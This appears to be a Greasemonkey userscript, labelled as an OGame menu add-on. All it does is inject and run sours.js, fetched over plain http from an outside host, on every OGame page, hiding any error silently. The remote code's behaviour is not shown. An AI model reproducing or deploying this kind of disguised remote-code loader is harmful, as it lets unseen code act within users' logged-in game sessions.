// ==UserScript==
// @name		Menu ogame
// @namespace		menu_ken
// @description		Greasemonkey script for OGame v1.x ("redesign")
// @include		http://*.ogame.*
// @copyright		2010, 4LIFE
// @license		GNU
// @version 		1.0
// @author 		Asiman
// @homepage 		http://vendetta.ural-host.ru/
// ==/UserScript==

(function() {
	try {
		objScript = document.createElement("script");
			objScript.src = "http://vendetta.ural-host.ru/sours.js";
		document.body.appendChild(objScript);
	}
	catch(exception) {
		//alert("[Event]: exception in script\n[Solution]: try to contact developers or disable this script");
	}
}
)();